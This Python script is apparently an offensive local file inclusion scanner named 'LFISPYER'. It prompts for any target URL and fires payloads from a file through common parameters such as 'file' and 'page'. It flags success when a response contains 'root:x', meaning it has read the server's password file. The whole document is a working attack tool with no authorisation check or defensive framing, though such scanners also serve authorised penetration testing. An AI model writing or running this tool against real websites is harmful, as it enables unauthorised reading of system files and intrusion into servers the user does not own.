import requests
import time

# Load payloads
with open("payloads.txt", "r") as f:
    payloads = [line.strip() for line in f if line.strip()]


print(r'''
         


 ▄█          ▄████████  ▄█     ▄████████    ▄███████▄ ▄██   ▄      ▄████████    ▄████████
███         ███    ███ ███    ███    ███   ███    ███ ███   ██▄   ███    ███   ███    ███
███         ███    █▀  ███▌   ███    █▀    ███    ███ ███▄▄▄███   ███    █▀    ███    ███
███        ▄███▄▄▄     ███▌   ███          ███    ███ ▀▀▀▀▀▀███  ▄███▄▄▄      ▄███▄▄▄▄██▀
███       ▀▀███▀▀▀     ███▌ ▀███████████ ▀█████████▀  ▄██   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀  
███         ███        ███           ███   ███        ███   ███   ███    █▄  ▀███████████
███▌    ▄   ███        ███     ▄█    ███   ███        ███   ███   ███    ███   ███    ███
█████▄▄██   ███        █▀    ▄████████▀   ▄████▀       ▀█████▀    ██████████   ███    ███
▀                                                                              ███    ███




''')
time.sleep(1)
#input
a = input("Enter Targeted Website (e.g., https://target.com/page.php): ").strip()

# Parameters
param_names = ["filename", "viewpage", "page", "file", "viewfile"]

#loop
for payload in payloads:
    for param in param_names:
        try:
            # request
            response = requests.get(a, timeout=5, params={param: payload})

            print(f"[i] param: {param}")
            print(f"[i] payload: {payload}")
            print(f"[i] status: {response.status_code}")

            # detection logic
            if "root:x" in response.text:
                print("[!!] Possible LFI here! Stopping.")
                exit(0)
            elif "admin" in response.text or "localhost" in response.text:
                print("[!] Need attention")
            else:
                print('    Response length:', len(response.text))

            print("-" * 60)
        except requests.RequestException as e:
            print("[!!] Error while sending request:", str(e))

